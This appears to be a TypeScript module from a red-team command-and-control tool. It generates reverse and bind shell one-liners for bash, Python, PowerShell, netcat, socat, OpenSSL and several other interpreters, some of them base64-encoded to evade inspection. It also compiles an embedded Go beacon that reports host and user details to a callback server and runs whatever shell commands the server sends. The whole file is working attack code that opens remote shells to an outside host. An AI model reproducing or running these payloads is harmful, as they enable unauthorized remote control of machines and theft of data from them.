import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { Buffer } from 'node:buffer'
import { runProcess } from './shell.ts'

const kinds: Record<string, string[]> = {
  http_beacon: ['curl_beacon'], https_beacon: ['curl_beacon'], websocket: ['curl_beacon'],
  tcp_reverse: ['bash', 'bash_udp', 'python', 'php', 'perl', 'ruby', 'node', 'java', 'lua', 'awk', 'nc', 'ncat', 'socat', 'openssl', 'powershell'],
  tcp_bind: ['nc_bind', 'ncat_bind', 'socat_bind', 'python_bind', 'powershell_bind'],
}

const listenerType = (metadata: any) => String(metadata.listener_type ?? metadata.type ?? 'http_beacon').trim().toLowerCase()
export const compatibleOneliners = (metadata: any) => kinds[listenerType(metadata)] ?? []
function callbackHost(metadata: any, override = '') {
  const host = override.trim() || String(listenerType(metadata) === 'tcp_bind' ? metadata.target_host ?? '' : metadata.callback_host ?? metadata.bind_host ?? '')
  if (!host || ['0.0.0.0', '::', '127.0.0.1', 'localhost'].includes(host)) throw new Error('Enter a callback address reachable from the target')
  return host
}
const b64 = (value: string, encoding: BufferEncoding = 'utf8') => Buffer.from(value, encoding).toString('base64')

export function generateOneliner(metadata: any, listenerId: string, token: string, requested: string, override = '') {
  const type = listenerType(metadata), kind = requested.trim().toLowerCase()
  if (!compatibleOneliners(metadata).includes(kind)) throw new Error(`${type} does not support ${kind}; available: ${compatibleOneliners(metadata).join(', ')}`)
  if (kind === 'curl_beacon') {
    let base = String(metadata.callback_url ?? '').replace(/\/$/, '')
    if (!base) { const port = Number(metadata.bind_port); if (!Number.isSafeInteger(port) || port < 1 || port > 65535) throw new Error('Invalid listener port'); base = `${type === 'https_beacon' ? 'https' : 'http'}://${callbackHost(metadata, override)}:${port}` }
    const body = '{"external_id":"curl-$(hostname)","hostname":"$(hostname)","username":"$(whoami)","os":"$(uname -s)","arch":"$(uname -m)","process":"curl","capabilities":["command"]}'
    return `bash -c 'while :; do curl -fsSk -H "X-RedTrace-Listener-Token: ${token}" -H "Content-Type: application/json" -X POST "${base}/c2/checkin/${listenerId}" -d '\''${body}'\'' >/dev/null 2>&1; sleep 5; done' &`
  }
  const host = callbackHost(metadata, override), port = Number(metadata.bind_port ?? metadata.target_port)
  if (!Number.isSafeInteger(port) || port < 1 || port > 65535) throw new Error('Invalid listener port')
  const python = `import socket,os,pty;s=socket.socket();s.connect((${JSON.stringify(host)},${port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn('/bin/sh')`
  const pythonBind = `import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',${port}));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn('/bin/sh')`
  const powerShell = `$c=New-Object Net.Sockets.TcpClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);$s.Write($r,0,$r.Length);$s.Flush()};$c.Close()`
  const powerShellBind = `$l=[Net.Sockets.TcpListener]::new([Net.IPAddress]::Any,${port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);$s.Write($r,0,$r.Length)}`
  const commands: Record<string, string> = {
    bash: `bash -c 'bash -i >& /dev/tcp/${host}/${port} 0>&1'`, bash_udp: `bash -c 'sh -i >& /dev/udp/${host}/${port} 0>&1'`,
    python: `python3 -c "import base64;exec(base64.b64decode('${b64(python)}'))"`, powershell: `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64(powerShell, 'utf16le')}`,
    php: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
    ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    node: `node -e 'const n=require("net"),s=require("child_process").spawn("/bin/sh",[]),c=new n.Socket();c.connect(${port},"${host}",()=>{c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)})'`,
    java: `jshell -q <<< 'new ProcessBuilder("/bin/sh","-c","exec 5<>/dev/tcp/${host}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done").start();'`,
    lua: `lua -e 'local s=require("socket").tcp();s:connect("${host}",${port});while true do local r,x=s:receive();local f=io.popen(r,"r");local b=f:read("*a");f:close();s:send(b);end'`,
    awk: `awk 'BEGIN {s="/inet/tcp/0/${host}/${port}";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}close(s)}' /dev/null`,
    nc: `nc ${host} ${port} -e /bin/sh`, ncat: `ncat ${host} ${port} -e /bin/sh`, socat: `socat TCP:${host}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,
    openssl: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${host}:${port} > /tmp/s; rm /tmp/s`,
    nc_bind: `nc -lvnp ${port} -e /bin/sh`, ncat_bind: `ncat -lvnp ${port} -e /bin/sh`, socat_bind: `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,
    python_bind: `python3 -c "import base64;exec(base64.b64decode('${b64(pythonBind)}'))"`, powershell_bind: `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64(powerShellBind, 'utf16le')}`,
  }
  return commands[kind]
}

const goBeacon = `package main
import("bytes";"encoding/json";"fmt";"io";"net/http";"os";"os/exec";"os/user";"runtime";"time")
const baseURL={{BASE_URL}};const listenerID={{LISTENER_ID}};const listenerToken={{LISTENER_TOKEN}};const sleepSeconds={{SLEEP}}
type checkinResponse struct{SessionID string \`json:"session_id"\`;SessionToken string \`json:"session_token"\`};type task struct{ID string \`json:"id"\`;Action string \`json:"action"\`;Arguments map[string]any \`json:"arguments"\`};type pollResponse struct{Tasks []task \`json:"tasks"\`}
func request(method,url,token string,body any)([]byte,error){var reader io.Reader;if body!=nil{b,e:=json.Marshal(body);if e!=nil{return nil,e};reader=bytes.NewReader(b)};req,e:=http.NewRequest(method,url,reader);if e!=nil{return nil,e};req.Header.Set("Content-Type","application/json");if token!=""{req.Header.Set("X-RedTrace-Session-Token",token)};resp,e:=(&http.Client{Timeout:60*time.Second}).Do(req);if e!=nil{return nil,e};defer resp.Body.Close();if resp.StatusCode<200||resp.StatusCode>=300{return nil,fmt.Errorf("http %d",resp.StatusCode)};return io.ReadAll(resp.Body)}
func checkin()(checkinResponse,error){hostname,_:=os.Hostname();current,_:=user.Current();username:="";if current!=nil{username=current.Username};payload:=map[string]any{"external_id":hostname+"-"+fmt.Sprint(os.Getpid()),"hostname":hostname,"username":username,"os":runtime.GOOS,"arch":runtime.GOARCH,"process":os.Args[0],"pid":os.Getpid(),"capabilities":[]string{"command"}};b,_:=json.Marshal(payload);req,e:=http.NewRequest("POST",baseURL+"/c2/checkin/"+listenerID,bytes.NewReader(b));if e!=nil{return checkinResponse{},e};req.Header.Set("Content-Type","application/json");req.Header.Set("X-RedTrace-Listener-Token",listenerToken);resp,e:=(&http.Client{Timeout:60*time.Second}).Do(req);if e!=nil{return checkinResponse{},e};defer resp.Body.Close();var result checkinResponse;e=json.NewDecoder(resp.Body).Decode(&result);return result,e}
func run(t task)(bool,string){if t.Action!="command"{return false,"unsupported action: "+t.Action};command,_:=t.Arguments["command"].(string);var cmd *exec.Cmd;if runtime.GOOS=="windows"{cmd=exec.Command("cmd.exe","/d","/s","/c",command)}else{cmd=exec.Command("/bin/sh","-c",command)};output,e:=cmd.CombinedOutput();if e!=nil{return false,string(output)+"\\n"+e.Error()};return true,string(output)}
func main(){var session checkinResponse;for{if session.SessionID==""{value,e:=checkin();if e==nil{session=value}}else{data,e:=request("POST",baseURL+"/c2/sessions/"+session.SessionID+"/poll",session.SessionToken,nil);if e!=nil{session=checkinResponse{}}else{var poll pollResponse;_=json.Unmarshal(data,&poll);for _,t:=range poll.Tasks{ok,output:=run(t);_,_=request("POST",baseURL+"/c2/sessions/"+session.SessionID+"/results/"+t.ID,session.SessionToken,map[string]any{"success":ok,"output":output,"summary":output})}}};time.Sleep(time.Duration(sleepSeconds)*time.Second)}}`

export async function buildBeacon(outputDir: string, input: { listenerId: string; listenerToken: string; metadata: any; callbackUrl?: string; os: string; arch: string; sleep: number }) {
  if (!['linux', 'windows', 'darwin'].includes(input.os) || !['amd64', 'arm64', '386'].includes(input.arch)) throw new Error('Unsupported target OS or architecture')
  let base = String(input.callbackUrl || input.metadata.callback_url || '').replace(/\/$/, '')
  if (!base) base = `${listenerType(input.metadata) === 'https_beacon' ? 'https' : 'http'}://${callbackHost(input.metadata)}:${Number(input.metadata.bind_port)}`
  const name = `beacon_${input.os}_${input.arch}_${input.listenerId}${input.os === 'windows' ? '.exe' : ''}`, output = path.join(outputDir, name), work = await mkdtemp(path.join(outputDir, '.build-'))
  const source = goBeacon.replace('{{BASE_URL}}', JSON.stringify(base)).replace('{{LISTENER_ID}}', JSON.stringify(input.listenerId)).replace('{{LISTENER_TOKEN}}', JSON.stringify(input.listenerToken)).replace('{{SLEEP}}', String(Math.max(1, Math.min(3600, input.sleep))))
  try {
    await writeFile(path.join(work, 'main.go'), source)
    const built = await runProcess('go', ['build', '-trimpath', '-ldflags=-s -w -buildid=', '-o', output, 'main.go'], work, { timeout: 180, env: { GOOS: input.os, GOARCH: input.arch, CGO_ENABLED: '0' } })
    if (built.exitCode) throw new Error(built.text.trim() || `Go build exited with ${built.exitCode}`)
    return output
  } finally { await rm(work, { recursive: true, force: true }) }
}
